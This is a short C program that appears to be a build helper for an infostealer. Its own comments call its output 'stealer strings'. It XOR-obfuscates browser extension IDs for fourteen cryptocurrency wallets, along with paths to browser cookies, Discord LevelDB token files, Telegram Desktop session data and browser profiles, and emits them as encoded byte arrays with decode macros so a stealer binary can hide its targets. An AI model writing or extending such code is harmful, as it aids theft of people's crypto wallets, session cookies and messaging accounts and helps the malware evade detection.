#include <stdio.h>
#include <string.h>

#define KEY 0x5A

void gen(const char* name, const char* s) {
    int len = (int)strlen(s);
    printf("/* \"%s\" */\n", s);
    printf("static const BYTE ENC_%s[] = {", name);
    for (int i = 0; i < len; i++) {
        printf("0x%02x", (unsigned char)s[i] ^ KEY);
        if (i < len - 1) printf(",");
    }
    printf("};\n");
    printf("#define DEC_%s(buf) _xd(buf, ENC_%s, %d, 0x5A)\n\n", name, name, len);
}

int main() {
    printf("/* v2.2: Wallet extension IDs (XOR 0x5A) */\n\n");
    gen("WALLET_METAMASK", "nkbihfbeogaeaoehlefnkodbefgpgknn");
    gen("WALLET_PHANTOM", "bfnaelmomeimhlpmgjnjophhpkkoljpa");
    gen("WALLET_COINBASE", "hnfanknocfeofbddgcijnmhnfnkdnaad");
    gen("WALLET_TRUST", "egjidjbpglichdcondbcbdnbeeppgdph");
    gen("WALLET_BINANCE", "fhbohimaelbohpjbbldcngcnapndodjp");
    gen("WALLET_RABBY", "acmacodkjbdgmoleebolmdjonilkdbch");
    gen("WALLET_OKX", "mcohilncbfahbmgdjkbpemcciiolgcge");
    gen("WALLET_SOLFLARE", "bhhhlbepdkbapadjdcodbhiefbnbdidos");
    gen("WALLET_KEPLR", "dmkamcknogkgcdfhhbddcghachkejeap");
    gen("WALLET_RONIN", "fnjhmkhhmkbjkkabndcnnogagogbneec");
    gen("WALLET_EXODUS", "aholpfdialjgjfhomihkjbmgjidlcdno");
    gen("WALLET_BRAVE", "odbfpeeihdkbihmopkbjmoonfanlbfcl");
    gen("WALLET_TRONLINK", "ibnejdfjmmkpcnlpebklmnkoeoihofec");
    gen("WALLET_ZERION", "klghhnkeealcohjjanjjdaeeggmfmlpl");

    printf("/* v2.2: Other stealer strings */\n\n");
    gen("LOCAL_EXT_SET", "Local Extension Settings");
    gen("NETWORK_COOKIES", "Network\\Cookies");
    gen("DISCORD_PATH", "discord");
    gen("DISCORD_PTB", "discordptb");
    gen("DISCORD_CANARY", "discordcanary");
    gen("TELEGRAM_PATH", "Telegram Desktop");
    gen("LEVELDB_LDB", "*.ldb");
    gen("LEVELDB_LOG", "*.log");
    gen("PROF_1", "Profile 1");
    gen("PROF_2", "Profile 2");
    gen("PROF_3", "Profile 3");
    gen("PROF_4", "Profile 4");
    gen("PROF_5", "Profile 5");
    gen("TDATA", "tdata");
    gen("APPDATA_ROAMING", "Roaming");
    
    return 0;
}
